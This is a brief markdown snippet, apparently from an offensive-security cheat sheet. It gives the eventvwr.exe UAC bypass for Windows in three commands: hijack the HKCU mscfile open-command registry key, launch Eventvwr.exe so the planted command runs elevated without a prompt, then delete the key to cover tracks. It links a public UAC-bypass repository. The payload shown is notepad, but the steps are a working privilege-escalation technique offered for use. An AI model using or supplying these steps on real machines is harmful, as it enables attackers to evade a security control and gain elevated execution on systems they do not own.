## Eventvwr
Step 1 : `reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /f /d "C:\windows\system32\notepad.exe"`

Step 2 : Run `Eventvwr.exe`

Step 3 : `reg delete HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /f`

## Documents 
- https://github.com/hfiref0x/UACME
